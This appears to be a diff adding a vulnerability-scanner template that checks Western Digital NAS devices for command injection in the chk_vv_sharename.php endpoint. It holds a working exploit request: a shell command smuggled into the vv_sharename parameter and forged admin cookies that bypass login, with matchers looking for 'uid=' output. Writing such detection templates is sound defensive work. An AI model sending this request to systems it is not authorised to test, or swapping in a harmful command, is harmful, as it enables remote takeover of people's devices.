@@ -1,0 +1,29 @@
+id: WesternDigital-chk_vv_sharename-RCE
+
+info:
+  name: WesternDigital-chk_vv_sharename-RCE
+  author: iSee857
+  severity: Critical
+  description: |
+    WesternDigital-chk_vv_sharename-RCE
+  tags: WesternDigital,rce
+
+http:
+  - raw:
+      - |
+        GET /web/php/chk_vv_sharename.php?vv_sharename=";id;" HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: isAdmin=1; username=admin;
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+
+      - type: status
+        status:
+          - 200
